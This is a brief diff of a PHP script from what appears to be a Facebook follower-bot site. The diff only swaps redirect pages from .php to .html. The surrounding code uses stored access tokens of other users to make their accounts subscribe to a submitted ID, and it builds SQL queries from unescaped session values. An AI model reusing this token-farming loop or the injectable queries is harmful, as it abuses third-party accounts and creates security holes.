@@ -26,11 +26,11 @@ $captcha = auto("https://www.google.com/recaptcha/api/siteverify?secret=6LeoOhsT
 $json = json_decode($captcha,true); 
 if($json['success'] != 1) 
 { 
-header('Location: welcome.php?i=2'); 
+header('Location: welcome.html?i=2'); 
 exit; 
 }else{ 
 if($dacho < $gioihan){ 
-header('Location: welcome.php?i=1'); 
+header('Location: welcome.html?i=1'); 
 }else{ 
 @mysqli_query($GLOBALS["___mysqli_ston"], "DELETE FROM BLOCK WHERE idfb = ".$_SESSION['idfb'].""); 
 @mysqli_query($GLOBALS["___mysqli_ston"], "INSERT INTO BLOCK SET `idfb` = ".$_SESSION['idfb'].", `thoigian` = '$hientai'"); 
@@ -39,7 +39,7 @@ while($gettoken = @mysqli_fetch_array($laytoken)){
 auto('https://graph.facebook.com/'.$_POST['idfb'].'/subscribers?method=post&access_token='.$gettoken['token']); 
 } 
 ((mysqli_free_result($laytoken) || (is_object($laytoken) && (get_class($laytoken) == "@mysqli_fetch_array"))) ? true : false); 
-header('Location: welcome.php?i=4'); 
+header('Location: welcome.html?i=4'); 
 } 
 } 
 } 
